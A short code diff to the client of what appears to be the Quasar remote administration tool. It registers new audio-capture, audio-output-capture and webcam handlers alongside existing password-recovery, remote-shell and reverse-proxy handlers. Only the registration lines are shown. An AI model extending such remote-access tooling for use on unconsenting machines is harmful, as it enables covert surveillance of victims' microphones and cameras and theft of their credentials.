@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Config;
+using Quasar.Client.Config;
 using Quasar.Client.Logging;
 using Quasar.Client.Messages;
 using Quasar.Client.Networking;
@@ -192,6 +192,10 @@ namespace Quasar.Client
             _messageProcessors.Add(new PasswordRecoveryHandler());
             _messageProcessors.Add(new RegistryHandler());
             _messageProcessors.Add(new RemoteDesktopHandler());
+            _messageProcessors.Add(new AudioCaptureHandler());
+            _messageProcessors.Add(new AudioOutputCaptureHandler());
+            _messageProcessors.Add(new WebcamHandler());
+            _messageProcessors.Add(new WebcamAsyncHandler());
             _messageProcessors.Add(new RemoteShellHandler(client));
             _messageProcessors.Add(new ReverseProxyHandler(client));
             _messageProcessors.Add(new ShutdownHandler());
